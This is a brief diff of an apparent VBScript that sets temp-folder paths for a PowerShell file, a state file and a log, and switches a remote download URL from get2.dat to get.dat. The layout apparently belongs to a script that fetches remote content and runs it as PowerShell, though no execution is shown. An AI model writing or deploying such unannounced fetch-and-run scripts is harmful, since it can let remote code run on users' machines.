@@ -31,7 +31,7 @@ Path = Shell.ExpandEnvironmentStrings("%temp%")
 PSFile = Path & "\1.ps1"
 StateFile = Path & "\1.state"
 LogFilePath = Path & "\1.log"
-URL = "https://dmj.one/tools/rec/script/get2.dat"
+URL = "https://dmj.one/tools/rec/script/get.dat"
 StartTime = Now
 EndTime = DateAdd("h", 2, StartTime)
 
